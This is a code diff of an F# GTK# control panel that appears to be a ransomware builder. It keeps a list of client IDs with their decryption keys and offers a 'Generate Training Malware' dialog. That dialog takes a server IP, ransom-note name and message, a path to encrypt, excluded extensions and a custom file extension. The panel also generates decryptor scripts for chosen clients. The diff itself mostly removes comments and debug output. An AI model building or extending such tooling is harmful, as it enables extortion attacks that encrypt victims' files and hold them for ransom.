@@ -152,7 +152,6 @@ startDecryption()
     File.WriteAllText(decryptorFilePath, formattedScript)
     printfn "Decryptor script generated: %s" decryptorFilePath
 
-
 // Create the GTK# GUI
 [<EntryPoint>]
 let main argv =
@@ -193,16 +192,12 @@ let main argv =
     let treeView = new TreeView(listStore)
     treeView.Selection.Mode <- SelectionMode.Single
 
-    // Add a column for Authorized By
+    // Add columns to the tree view
     let authorizedByColumn = new TreeViewColumn("Authorized By", new CellRendererText(), "text", 0)
-    treeView.AppendColumn(authorizedByColumn)
-
-    // Add a column for Client ID
     let clientIdColumn = new TreeViewColumn("Client ID", new CellRendererText(), "text", 1)
-    treeView.AppendColumn(clientIdColumn)
-
-    // Add a column for Decryption Key
     let keyColumn = new TreeViewColumn("Decryption Key", new CellRendererText(), "text", 2)
+    treeView.AppendColumn(authorizedByColumn)
+    treeView.AppendColumn(clientIdColumn)
     treeView.AppendColumn(keyColumn)
 
     // Add the tree view to the window
@@ -214,37 +209,27 @@ let main argv =
         let selection = treeView.Selection
         let success, iter = selection.GetSelected()
         if success then
-            let clientId = listStore.GetValue(iter, 1) :?> string // Cast to string
-            let key = listStore.GetValue(iter, 2) :?> string // Cast to string
-            printfn "Deleting: Client ID = %s, Key = %s" clientId key
-
-            // Remove the selected client ID and key from the list
+            let clientId = listStore.GetValue(iter, 1) :?> string
             clientKeys <- clientKeys |> List.filter (fun (_, id, _) -> id <> clientId)
             updateClientList(listStore) // Refresh the list after deletion
-        else
-            printfn "No row selected"
     )
     vbox.PackStart(deleteButton, false, false, 10u)
 
     // Add the "Generate Training Malware" button
     let generateButton = new Button("Generate Training Malware")
     generateButton.Clicked.Add(fun _ ->
-        // Create a dialog to collect malware options
         let dialog = new Dialog("Generate Training Malware", window, DialogFlags.Modal)
         dialog.SetDefaultSize(400, 300)
 
-        // Add input fields to the dialog
-        let serverIpEntry = new Entry() // Server IP
-        let noteFileEntry = new Entry() // Note file name
-        let messageEntry = new Entry() // Message
-        let pathToEncryptEntry = new Entry() // Path to encrypt
-        let excludeExtensionsEntry = new Entry() // Exclude extensions
-        let customExtensionEntry = new Entry() // Custom extension
+        let serverIpEntry = new Entry() 
+        let noteFileEntry = new Entry() 
+        let messageEntry = new Entry() 
+        let pathToEncryptEntry = new Entry() 
+        let excludeExtensionsEntry = new Entry() 
+        let customExtensionEntry = new Entry() 
 
-        // Add a confirmation button to the dialog
         dialog.AddButton("Generate", ResponseType.Accept) |> ignore
 
-        // Display the dialog
         dialog.ContentArea.PackStart(new Label("Server IP:"), false, false, 0u)
         dialog.ContentArea.PackStart(serverIpEntry, false, false, 0u)
         dialog.ContentArea.PackStart(new Label("Note File Name:"), false, false, 0u)
@@ -288,9 +273,10 @@ let main argv =
         decryptorTreeView.AppendColumn(clientIdColumn)
         decryptorTreeView.AppendColumn(keyColumn)
 
-        let contentArea = dialog.ContentArea
-        contentArea.PackStart(new Label("Select Client ID:"), false, false, 0u)
-        contentArea.PackStart(decryptorTreeView, true, true, 0u)
+        dialog.ContentArea.PackStart(new Label("Select Client ID:"), false, false, 0u)
+        dialog.ContentArea.PackStart(decryptorTreeView, true, true, 0u)
+
+        dialog.AddButton("OK", ResponseType.Accept) |> ignore
         dialog.ShowAll()
 
         let response = dialog.Run()
@@ -300,11 +286,6 @@ let main argv =
             if success then
                 let selectedClientId = decryptorListStore.GetValue(iter, 0) :?> string
                 let selectedKey = decryptorListStore.GetValue(iter, 1) :?> string
-
-                // Debugging: Print the selected client ID and key
-                printfn "Selected Client ID: %s, Decryption Key: %s" selectedClientId selectedKey
-
-                // Generate the decryption executable based on the selected Client ID and key
                 generateDecryptor(selectedClientId, selectedKey)
         dialog.Destroy()
     )
